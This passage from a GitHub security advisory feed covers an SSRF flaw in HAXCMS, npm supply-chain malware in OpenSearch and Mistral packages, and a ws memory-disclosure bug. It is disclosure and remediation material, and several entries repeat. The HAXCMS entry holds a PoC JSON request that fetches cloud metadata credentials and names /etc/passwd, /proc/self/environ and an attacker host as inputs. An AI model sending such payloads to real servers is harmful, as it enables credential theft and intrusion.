<li>User input (<code>build.files</code>) is processed via <code>object_to_array()</code> into a PHP array  </li>
<li>Assigned to <code>$filesToDownload</code> in <code>Operations.php</code> (line 2626)  </li>
<li>Iterated over in <code>Operations.php</code> (line 2730), where each entry is passed to <code>HAXCMSFile::save()</code> with bulk-import enabled</li>
</ul>
<p>In <code>HAXCMSFile.php</code> (line 30), the following occurs:</p>
<pre><code class="language-php">file_get_contents($upload['tmp_name']);
</code></pre>
<p>Here, tmp_name is attacker-controlled and may contain:</p>
<ul>
<li>External URLs (<code>http://attacker.com</code>)</li>
<li>Internal services (<code>http://127.0.0.1</code>)</li>
<li>Cloud metadata endpoints (<code>http://169.254.169.254</code>)</li>
<li>Local file paths (<code>/etc/passwd</code>, <code>/proc/self/environ</code>)</li>
</ul>
<p>The bulk-import flag bypasses <code>is_uploaded_file()</code> validation, which normally ensures the file originates from a legitimate upload. The only restriction is an extension whitelist based on the filename (array key), which is fully attacker-controlled.</p>
<p>There are no restrictions on:</p>
<ul>
<li>URL schemes (<code>http</code>, <code>file</code>, <code>gopher</code>, etc.)</li>
<li>Destination IP ranges (internal, loopback, metadata services)</li>
<li>Response content</li>
</ul>
<p>All fetched content is written to:</p>
<pre><code>sites/&lt;sitename&gt;/files/&lt;filename&gt;
</code></pre>
<p>and is accessible via the web.</p>
<h3 id="poc">PoC</h3>
<p>Prerequisites:</p>
<ul>
<li>Authenticated session (default credentials: <code>admin/admin</code> on fresh installs)</li>
<li>Valid JWT and CSRF token</li>
</ul>
<p>Step 1: Log in and capture JWT + CSRF token</p>
<p>Step 2: Send crafted request:</p>
<pre><code>POST /createSite HTTP/1.1
Host: target
Authorization: Bearer [JWT]
X-CSRF-Token: [TOKEN]
Content-Type: application/json

{
  "site": {
    "name": "poc"
  },
  "build": {
    "files": {
      "poc.txt": {
        "tmp_name": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      }
    }
  }
}
</code></pre>
<p>Step 3: Retrieve response:</p>
<pre><code>GET /sites/poc/files/poc.txt
</code></pre>
<p>The response will contain the fetched content (e.g., cloud credentials or internal service data).</p>
<h3 id="impact">Impact</h3>
<ul>
<li>SSRF enabling access to internal network services</li>
<li>Arbitrary file read via local filesystem paths</li>
<li>Cloud credential exposure through metadata endpoints</li>
<li>Data exfiltration via web-accessible file storage</li>
</ul>
<p>Any authenticated user can exploit this to access sensitive server or infrastructure data, potentially leading to full system or cloud environment compromise.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-q862-gcgq-5m6g">https://github.com/haxtheweb/issues/security/advisories/GHSA-q862-gcgq-5m6g</a></li>
<li><a href="https://github.com/advisories/GHSA-q862-gcgq-5m6g">https://github.com/advisories/GHSA-q862-gcgq-5m6g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q862-gcgq-5m6g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T14:44:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@opensearch-project/opensearch] Malware in @opensearch-project/opensearch]]></title>
        <id>https://github.com/advisories/GHSA-27f5-xjrr-q9ff</id>
        <link href="https://github.com/advisories/GHSA-27f5-xjrr-q9ff"/>
        <updated>2026-05-19T14:35:07.000Z</updated>
        <content type="html"><![CDATA[<h2 id="overview">Overview</h2>
<p>The OpenSearch Project has sustained a security incident involving an external actor gaining force-push permissions within the project's CI infrastructure to embed malicious packages into four release versions of <code>@opensearch-project/opensearch</code>. Users are instructed to immediately take actions recommended in the <strong>Remediation</strong> section of this advisory.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p><strong>Package</strong>: <code>@opensearch-project/opensearch</code></p>
<table>
<thead>
<tr>
<th>Version</th>
<th>Published (UTC)</th>
<th>Published (America/New_York)</th>
</tr>
</thead>
<tbody><tr>
<td>3.5.3</td>
<td>2026-05-12T00:47:39Z</td>
<td>May 11, 2026, 8:47:39 PM EDT</td>
</tr>
<tr>
<td>3.6.2</td>
<td>2026-05-12T00:29:34Z</td>
<td>May 11, 2026, 8:29:34 PM EDT</td>
</tr>
<tr>
<td>3.7.0</td>
<td>2026-05-12T00:42:29Z</td>
<td>May 11, 2026, 8:42:29 PM EDT</td>
</tr>
<tr>
<td>3.8.0</td>
<td>2026-05-12T00:43:54Z</td>
<td>May 11, 2026, 8:43:54 PM EDT</td>
</tr>
</tbody></table>
<h2 id="remediation">Remediation</h2>
<p>Any computer that has these package versions installed or updated between 00:00 UTC 12 May 2026 (8:00 PM EDT 11 May 2026) and 10:00 UTC 12 May 2026 (6:00 AM EDT 12 May 2026) should be considered fully compromised. Steps should immediately be taken to prevent further compromise.</p>
<ul>
<li><strong>All secrets and keys</strong> stored on that computer should be rotated immediately from an alternate system.</li>
<li>The affected packages should be removed immediately, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.</li>
</ul>
<h2 id="references">References</h2>
<p><a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">GHSA-g7cv-rxg3-hmpx</a>
<a href="https://github.com/TanStack/router/issues/7383">https://github.com/TanStack/router/issues/7383</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/opensearch-project/opensearch-js/security/advisories/GHSA-27f5-xjrr-q9ff">https://github.com/opensearch-project/opensearch-js/security/advisories/GHSA-27f5-xjrr-q9ff</a></li>
<li><a href="https://github.com/advisories/GHSA-27f5-xjrr-q9ff">https://github.com/advisories/GHSA-27f5-xjrr-q9ff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-27f5-xjrr-q9ff</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-19T14:35:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@opensearch-project/opensearch] Malware in @opensearch-project/opensearch]]></title>
        <id>https://github.com/advisories/GHSA-27f5-xjrr-q9ff</id>
        <link href="https://github.com/advisories/GHSA-27f5-xjrr-q9ff"/>
        <updated>2026-05-19T14:35:07.000Z</updated>
        <content type="html"><![CDATA[<h2 id="overview">Overview</h2>
<p>The OpenSearch Project has sustained a security incident involving an external actor gaining force-push permissions within the project's CI infrastructure to embed malicious packages into four release versions of <code>@opensearch-project/opensearch</code>. Users are instructed to immediately take actions recommended in the <strong>Remediation</strong> section of this advisory.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p><strong>Package</strong>: <code>@opensearch-project/opensearch</code></p>
<table>
<thead>
<tr>
<th>Version</th>
<th>Published (UTC)</th>
<th>Published (America/New_York)</th>
</tr>
</thead>
<tbody><tr>
<td>3.5.3</td>
<td>2026-05-12T00:47:39Z</td>
<td>May 11, 2026, 8:47:39 PM EDT</td>
</tr>
<tr>
<td>3.6.2</td>
<td>2026-05-12T00:29:34Z</td>
<td>May 11, 2026, 8:29:34 PM EDT</td>
</tr>
<tr>
<td>3.7.0</td>
<td>2026-05-12T00:42:29Z</td>
<td>May 11, 2026, 8:42:29 PM EDT</td>
</tr>
<tr>
<td>3.8.0</td>
<td>2026-05-12T00:43:54Z</td>
<td>May 11, 2026, 8:43:54 PM EDT</td>
</tr>
</tbody></table>
<h2 id="remediation">Remediation</h2>
<p>Any computer that has these package versions installed or updated between 00:00 UTC 12 May 2026 (8:00 PM EDT 11 May 2026) and 10:00 UTC 12 May 2026 (6:00 AM EDT 12 May 2026) should be considered fully compromised. Steps should immediately be taken to prevent further compromise.</p>
<ul>
<li><strong>All secrets and keys</strong> stored on that computer should be rotated immediately from an alternate system.</li>
<li>The affected packages should be removed immediately, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.</li>
</ul>
<h2 id="references">References</h2>
<p><a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">GHSA-g7cv-rxg3-hmpx</a>
<a href="https://github.com/TanStack/router/issues/7383">https://github.com/TanStack/router/issues/7383</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/opensearch-project/opensearch-js/security/advisories/GHSA-27f5-xjrr-q9ff">https://github.com/opensearch-project/opensearch-js/security/advisories/GHSA-27f5-xjrr-q9ff</a></li>
<li><a href="https://github.com/advisories/GHSA-27f5-xjrr-q9ff">https://github.com/advisories/GHSA-27f5-xjrr-q9ff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-27f5-xjrr-q9ff</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-19T14:35:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@opensearch-project/opensearch] Malware in @opensearch-project/opensearch]]></title>
        <id>https://github.com/advisories/GHSA-27f5-xjrr-q9ff</id>
        <link href="https://github.com/advisories/GHSA-27f5-xjrr-q9ff"/>
        <updated>2026-05-19T14:35:07.000Z</updated>
        <content type="html"><![CDATA[<h2 id="overview">Overview</h2>
<p>The OpenSearch Project has sustained a security incident involving an external actor gaining force-push permissions within the project's CI infrastructure to embed malicious packages into four release versions of <code>@opensearch-project/opensearch</code>. Users are instructed to immediately take actions recommended in the <strong>Remediation</strong> section of this advisory.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p><strong>Package</strong>: <code>@opensearch-project/opensearch</code></p>
<table>
<thead>
<tr>
<th>Version</th>
<th>Published (UTC)</th>
<th>Published (America/New_York)</th>
</tr>
</thead>
<tbody><tr>
<td>3.5.3</td>
<td>2026-05-12T00:47:39Z</td>
<td>May 11, 2026, 8:47:39 PM EDT</td>
</tr>
<tr>
<td>3.6.2</td>
<td>2026-05-12T00:29:34Z</td>
<td>May 11, 2026, 8:29:34 PM EDT</td>
</tr>
<tr>
<td>3.7.0</td>
<td>2026-05-12T00:42:29Z</td>
<td>May 11, 2026, 8:42:29 PM EDT</td>
</tr>
<tr>
<td>3.8.0</td>
<td>2026-05-12T00:43:54Z</td>
<td>May 11, 2026, 8:43:54 PM EDT</td>
</tr>
</tbody></table>
<h2 id="remediation">Remediation</h2>
<p>Any computer that has these package versions installed or updated between 00:00 UTC 12 May 2026 (8:00 PM EDT 11 May 2026) and 10:00 UTC 12 May 2026 (6:00 AM EDT 12 May 2026) should be considered fully compromised. Steps should immediately be taken to prevent further compromise.</p>
<ul>
<li><strong>All secrets and keys</strong> stored on that computer should be rotated immediately from an alternate system.</li>
<li>The affected packages should be removed immediately, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.</li>
</ul>
<h2 id="references">References</h2>
<p><a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">GHSA-g7cv-rxg3-hmpx</a>
<a href="https://github.com/TanStack/router/issues/7383">https://github.com/TanStack/router/issues/7383</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/opensearch-project/opensearch-js/security/advisories/GHSA-27f5-xjrr-q9ff">https://github.com/opensearch-project/opensearch-js/security/advisories/GHSA-27f5-xjrr-q9ff</a></li>
<li><a href="https://github.com/advisories/GHSA-27f5-xjrr-q9ff">https://github.com/advisories/GHSA-27f5-xjrr-q9ff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-27f5-xjrr-q9ff</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-19T14:35:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@opensearch-project/opensearch] Malware in @opensearch-project/opensearch]]></title>
        <id>https://github.com/advisories/GHSA-27f5-xjrr-q9ff</id>
        <link href="https://github.com/advisories/GHSA-27f5-xjrr-q9ff"/>
        <updated>2026-05-19T14:35:07.000Z</updated>
        <content type="html"><![CDATA[<h2 id="overview">Overview</h2>
<p>The OpenSearch Project has sustained a security incident involving an external actor gaining force-push permissions within the project's CI infrastructure to embed malicious packages into four release versions of <code>@opensearch-project/opensearch</code>. Users are instructed to immediately take actions recommended in the <strong>Remediation</strong> section of this advisory.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p><strong>Package</strong>: <code>@opensearch-project/opensearch</code></p>
<table>
<thead>
<tr>
<th>Version</th>
<th>Published (UTC)</th>
<th>Published (America/New_York)</th>
</tr>
</thead>
<tbody><tr>
<td>3.5.3</td>
<td>2026-05-12T00:47:39Z</td>
<td>May 11, 2026, 8:47:39 PM EDT</td>
</tr>
<tr>
<td>3.6.2</td>
<td>2026-05-12T00:29:34Z</td>
<td>May 11, 2026, 8:29:34 PM EDT</td>
</tr>
<tr>
<td>3.7.0</td>
<td>2026-05-12T00:42:29Z</td>
<td>May 11, 2026, 8:42:29 PM EDT</td>
</tr>
<tr>
<td>3.8.0</td>
<td>2026-05-12T00:43:54Z</td>
<td>May 11, 2026, 8:43:54 PM EDT</td>
</tr>
</tbody></table>
<h2 id="remediation">Remediation</h2>
<p>Any computer that has these package versions installed or updated between 00:00 UTC 12 May 2026 (8:00 PM EDT 11 May 2026) and 10:00 UTC 12 May 2026 (6:00 AM EDT 12 May 2026) should be considered fully compromised. Steps should immediately be taken to prevent further compromise.</p>
<ul>
<li><strong>All secrets and keys</strong> stored on that computer should be rotated immediately from an alternate system.</li>
<li>The affected packages should be removed immediately, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.</li>
</ul>
<h2 id="references">References</h2>
<p><a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">GHSA-g7cv-rxg3-hmpx</a>
<a href="https://github.com/TanStack/router/issues/7383">https://github.com/TanStack/router/issues/7383</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/opensearch-project/opensearch-js/security/advisories/GHSA-27f5-xjrr-q9ff">https://github.com/opensearch-project/opensearch-js/security/advisories/GHSA-27f5-xjrr-q9ff</a></li>
<li><a href="https://github.com/advisories/GHSA-27f5-xjrr-q9ff">https://github.com/advisories/GHSA-27f5-xjrr-q9ff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-27f5-xjrr-q9ff</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-19T14:35:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ws] ws: Uninitialized memory disclosure]]></title>
        <id>https://github.com/advisories/GHSA-58qx-3vcg-4xpx</id>
        <link href="https://github.com/advisories/GHSA-58qx-3vcg-4xpx"/>
        <updated>2026-05-18T19:02:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>websocket.close()</code> implementation is vulnerable to uninitialized memory disclosure when a <code>TypedArray</code> is passed as the reason argument.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<pre><code class="language-js">import { deepStrictEqual } from 'node:assert';
import { WebSocket, WebSocketServer } from 'ws';

const wss = new WebSocketServer(
  { port: 0, skipUTF8Validation: true },
  function () {
    const { port } = wss.address();
    const ws = new WebSocket(`ws://localhost:${port}`, {
      skipUTF8Validation: true
    });

    ws.on('close', function (code, reason) {
      deepStrictEqual(reason, Buffer.alloc(80));
    });
  }
);

wss.on('connection', function (ws) {
  ws.close(1000, new Float32Array(20));
});
</code></pre>
<h3 id="patches">Patches</h3>
<p>The vulnerability was fixed in <a href="mailto:ws@8.20.1">ws@8.20.1</a> (<a href="https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086">https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086</a>).</p>
<h3 id="credits">Credits</h3>
<p>Credit for the private and responsible disclosure of this issue goes to <a href="https://github.com/ChALkeR">Nikita Skovoroda</a>.</p>
<h3 id="remarks">Remarks</h3>
<p>Although the calculated CVSS severity is medium, the actual severity is believed to be low, as the flaw is only exploitable through misuse that is unlikely in practice.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://github.com/advisories/GHSA-58qx-3vcg-4xpx">https://github.com/advisories/GHSA-58qx-3vcg-4xpx</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2026-45736">https://www.cve.org/CVERecord?id=CVE-2026-45736</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/websockets/ws/security/advisories/GHSA-58qx-3vcg-4xpx">https://github.com/websockets/ws/security/advisories/GHSA-58qx-3vcg-4xpx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-45736">https://nvd.nist.gov/vuln/detail/CVE-2026-45736</a></li>
<li><a href="https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086">https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086</a></li>
<li><a href="https://github.com/advisories/GHSA-58qx-3vcg-4xpx">https://github.com/advisories/GHSA-58qx-3vcg-4xpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-58qx-3vcg-4xpx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-18T19:02:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@mistralai/mistralai-gcp] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
        <updated>2026-05-18T17:55:55.000Z</updated>
        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
<h2 id="impact">Impact</h2>
<p>The dropper <strong>is broken</strong>, it has no impact. </p>
<ul>
<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
</ul>
</li>
</ul>
<p>We still recommend removing the packages, see below for remediation.</p>
<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
<table>
<thead>
<tr>
<th>Package</th>
<th>Affected versions</th>
</tr>
</thead>
<tbody><tr>
<td><code>@mistralai/mistralai</code></td>
<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
</tr>
<tr>
<td><code>@mistralai/mistralai-azure</code></td>
<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
</tr>
<tr>
<td><code>@mistralai/mistralai-gcp</code></td>
<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
</tr>
</tbody></table>
<p>Check installed versions:</p>
<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
</code></pre>
<p>Look for any of the following files</p>
<ul>
<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
</ul>
<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
<h2 id="remediate-affected-systems">Remediate affected systems</h2>
<ol>
<li>Stop using the affected package version immediately.</li>
<li>Clean systems where one of this package has been installed.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-18T17:55:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@mistralai/mistralai-gcp] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
        <updated>2026-05-18T17:55:55.000Z</updated>
        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
<h2 id="impact">Impact</h2>
<p>The dropper <strong>is broken</strong>, it has no impact. </p>
<ul>
<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
</ul>
</li>
</ul>
<p>We still recommend removing the packages, see below for remediation.</p>
<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
<table>
<thead>
<tr>
<th>Package</th>
<th>Affected versions</th>
</tr>
</thead>
<tbody><tr>
<td><code>@mistralai/mistralai</code></td>
<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
</tr>
<tr>
<td><code>@mistralai/mistralai-azure</code></td>
<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
</tr>
<tr>
<td><code>@mistralai/mistralai-gcp</code></td>
<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
</tr>
</tbody></table>
<p>Check installed versions:</p>
<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
</code></pre>
<p>Look for any of the following files</p>
<ul>
<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
</ul>
<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
<h2 id="remediate-affected-systems">Remediate affected systems</h2>
<ol>
<li>Stop using the affected package version immediately.</li>
<li>Clean systems where one of this package has been installed.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-18T17:55:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@mistralai/mistralai-azure] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
        <updated>2026-05-18T17:55:55.000Z</updated>
        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
<h2 id="impact">Impact</h2>
<p>The dropper <strong>is broken</strong>, it has no impact. </p>
<ul>
<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
</ul>
</li>
</ul>
<p>We still recommend removing the packages, see below for remediation.</p>
<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
<table>
<thead>
<tr>
<th>Package</th>
<th>Affected versions</th>
</tr>
</thead>
<tbody><tr>
<td><code>@mistralai/mistralai</code></td>
<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
</tr>
<tr>
<td><code>@mistralai/mistralai-azure</code></td>
<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
</tr>
<tr>
<td><code>@mistralai/mistralai-gcp</code></td>
<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
</tr>
</tbody></table>
<p>Check installed versions:</p>
<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
</code></pre>
<p>Look for any of the following files</p>
<ul>
<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
</ul>
<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
<h2 id="remediate-affected-systems">Remediate affected systems</h2>
<ol>
<li>Stop using the affected package version immediately.</li>
<li>Clean systems where one of this package has been installed.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
